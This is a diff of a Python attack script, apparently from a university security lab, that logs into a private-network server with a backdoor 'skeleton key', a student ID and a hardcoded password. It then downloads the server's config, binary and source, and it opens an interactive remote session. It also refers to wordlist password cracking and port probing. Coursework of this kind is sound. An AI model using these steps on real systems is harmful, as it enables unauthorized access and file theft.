@@ -8,8 +8,7 @@ import datetime
 
 HOST = '192.168.1.10'
 SKELETONKEY = 'Passepartout'
-BYTES = 1024
-BINBYTES = 30 * BYTES
+BYTES = 100000
 CRUZID = 'bosdhill\n'
 
 def create_dict():
@@ -19,31 +18,68 @@ def create_dict():
           passwords.append(line.replace('\n',''))
      return passwords
 
-def connect_with_pass():
+def send_data(s, message, value, f):
+     print("Sending %s..." % message)
+     data = get_data(s, value)
+     if f == True:
+          fp = open(message, "wb")
+          fp.write(data)
+
+def get_data(s, value):
+     s.sendall(bytes(value, 'utf-8'))
+     time.sleep(1)
+     data = s.recv(BYTES)
+     return data
+
+def get_config():
      PORT = 10247
      password = "BristolRovers"
+     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+     s.connect((HOST, PORT))
+     send_data(s, "skeleton key", SKELETONKEY, False)
+     send_data(s, "username", CRUZID, False)
+     send_data(s, "password", password, False)
+     send_data(s, "config", "config\n", True)
+     s.close()
+
+def get_binary():
+     PORT = 10247
+     password = "BristolRovers"
+     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+     s.connect((HOST, PORT))
+     send_data(s, "skeleton key", SKELETONKEY, False)
+     send_data(s, "username", CRUZID, False)
+     send_data(s, "password", password, False)
+     send_data(s, "server", "binary\n", True)
+     s.close()
+
+def get_source():
+     PORT = 10247
+     password = "BristolRovers"
+     s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+     s.connect((HOST, PORT))
+     send_data(s, "skeleton key", SKELETONKEY, False)
+     send_data(s, "username", CRUZID, False)
+     send_data(s, "password", password, False)
+     send_data(s, "server.c", "source\n", True)
+     s.close()
+
+def auto_connect():
+     get_config()
+     get_binary()
+     get_source()
+
+def shell_connect():
+     PORT = 10247
      s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
      s.connect((HOST, PORT))
      print("Sending skeletonkey...")
      s.sendall(bytes(SKELETONKEY, 'utf-8'))
      data = s.recv(BYTES)
      while True:
-          x = input(data.decode('utf-8'))
+          x = input(data.decode('unicode-escape'))
           s.sendall(bytes(x, 'utf-8'))
           data = s.recv(BYTES)
-     # print("Sending username...")
-     # s.sendall(CRUZID)
-     # data = s.recv(BYTES)
-     # print("Received: %s" % data)
-     # s.sendall(password)
-     # data = s.recv(BYTES)
-     # print("Received: %s" % data)
-     # s.sendall("binary\n")
-     # data = s.recv(BINBYTES)
-     # print("Received: %s" % data)
-     # s.sendall("source\n")
-     # data = s.recv(BINBYTES)
-     # print("Received: %s" % data)
 
 # Assuming NO initial lockout
 def crack_password(PORT):
@@ -117,7 +153,8 @@ def try_ports():
 
 if __name__ == "__main__":
 #     crack_password(10247)
-	connect_with_pass()
+	# shell_connect()
+     auto_connect()
 
 
 
